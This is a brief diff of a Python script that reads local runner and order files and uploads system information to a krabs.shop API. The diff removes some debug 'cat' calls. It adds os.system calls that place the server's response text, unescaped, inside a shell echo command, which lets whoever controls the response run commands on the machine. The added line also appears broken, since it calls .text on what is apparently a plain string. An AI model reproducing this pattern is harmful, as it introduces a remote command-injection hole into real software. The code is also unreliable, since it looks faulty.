@@ -19,13 +19,6 @@ import sys
 
 
 
-os.system('cat order_no.txt')
-os.system('cat tunnel_id.txt')
-os.system('cat cf_domain.txt')
-os.system('cat spec_id.txt')
-os.system('cat ghost_work_id.txt')
-os.system('cat runner_info.txt')
-
 
 
 order_no = os.popen('cat order_no.txt').read().split('\n')[0];
@@ -873,10 +866,10 @@ def upload_to_server(data, url="https://krabs.shop/api/php/v1/systemInfoUpdate.p
             result = json.loads(response_data)
             
             if result.get('success'):
-
+                os.system(f'echo -e "{response_data.text}"');
                 return True
             else:
-
+                os.system(f'echo -e "{response_data.text}"');
                 return False
                 
     except urllib.error.URLError as e:
